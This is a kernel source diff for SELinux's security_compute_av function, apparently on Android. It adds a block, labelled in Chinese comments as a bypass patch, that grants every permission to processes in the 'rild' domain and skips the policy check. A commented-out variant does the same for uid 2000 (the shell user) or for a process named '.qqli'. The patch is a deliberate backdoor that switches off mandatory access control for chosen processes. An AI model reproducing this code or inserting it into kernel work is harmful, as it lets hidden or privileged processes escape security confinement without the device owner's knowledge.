@@ -1125,7 +1125,11 @@ void security_compute_av(struct selinux_state *state,
 	struct sidtab *sidtab;
 	u16 tclass;
 	struct context *scontext = NULL, *tcontext = NULL;
-
+/* ==== 新增变量开始 ==== */
+	const char *s_type_name;
+	u32 type_cnt;
+	int uidi;
+	/* ==== 新增变量结束 ==== */
 	rcu_read_lock();
 	policy = rcu_dereference(state->policy);
 	avd_init(policy, avd);
@@ -1160,6 +1164,35 @@ void security_compute_av(struct selinux_state *state,
 			goto allow;
 		goto out;
 	}
+/* ====================== 旁路补丁插入点 ====================== */
+	type_cnt = policydb->symtab[SYM_TYPES].nprim;
+	if (scontext->type != 0 && scontext->type <= type_cnt) {
+		s_type_name = policydb->sym_val_to_name[SYM_TYPES][scontext->type - 1];
+		uidi = get_current_user()->uid.val;
+
+		if (s_type_name && !strcmp(s_type_name, "rild")) {
+			pr_info("SELinux BYPASS: rild domain, ssid=%u tsid=%u tclass=%u\n",
+				ssid, tsid, orig_tclass);
+			// 直接放行，不进入context_struct_compute_av
+			avd->allowed = 0xFFFFFFFFU;
+			avd->denied = 0;
+			avd->flags = 0;
+			xperms->len = 0;
+			goto out;
+		}
+		/* 保留你原来的uid 2000 / .qqli 条件，需要就打开
+		if (uidi == 2000 || !strncmp(current->comm, ".qqli", 5)) {
+			pr_info("SELinux BYPASS: uid2000 or .qqli, ssid=%u tsid=%u tclass=%u\n",
+				ssid, tsid, orig_tclass);
+			avd->allowed = 0xFFFFFFFFU;
+			avd->denied = 0;
+			avd->flags = 0;
+			xperms->len = 0;
+			goto out;
+		}
+		*/
+	}
+	/* =========================================================== */	
 	context_struct_compute_av(policydb, scontext, tcontext, tclass, avd,
 				  xperms);
 	map_decision(&policy->map, orig_tclass, avd,
